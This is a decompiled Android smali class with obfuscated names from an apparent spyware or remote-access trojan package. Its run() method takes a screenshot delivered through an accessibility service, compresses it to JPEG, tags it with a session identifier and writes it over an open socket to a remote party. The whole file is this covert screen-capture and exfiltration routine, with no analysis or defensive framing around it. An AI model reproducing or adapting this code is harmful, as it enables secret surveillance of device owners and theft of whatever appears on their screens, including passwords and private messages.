.class Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4$1;
.super Ljava/lang/Thread;
.source "etepaejhucdoifemyubbjerbt112.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4;->onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4;

.field final synthetic val$screenshotResult:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;


# direct methods
.method constructor <init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4;Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 0

    .line 329
    iput-object p1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4$1;->this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4;

    iput-object p2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4$1;->val$screenshotResult:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .line 333
    :try_start_0
    iget-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4$1;->val$screenshotResult:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;->getHardwareBuffer()Landroid/hardware/HardwareBuffer;

    move-result-object v0

    iget-object v1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4$1;->val$screenshotResult:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;->getColorSpace()Landroid/graphics/ColorSpace;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/graphics/Bitmap;->wrapHardwareBuffer(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 336
    :try_start_1
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 339
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v2

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v3

    const/4 v4, 0x0

    .line 338
    invoke-static {v0, v4, v4, v2, v3}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 341
    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x14

    invoke-virtual {v0, v2, v3, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 344
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    .line 348
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->scr:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ":SK:SK:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->PID:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->_formtpakt_methd_(Ljava/lang/String;[B)[B

    move-result-object v0

    .line 349
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->rec_etepaejhucdoifemyubbjerbt12_iver:Ljava/net/Socket;

    array-length v2, v0

    invoke-virtual {v1, v2}, Ljava/net/Socket;->setSendBufferSize(I)V

    .line 350
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->outpu_etepaejhucdoifemyubbjerbt12_tnew:Ljava/io/OutputStream;

    array-length v2, v0

    invoke-virtual {v1, v0, v4, v2}, Ljava/io/OutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 356
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    .line 359
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method
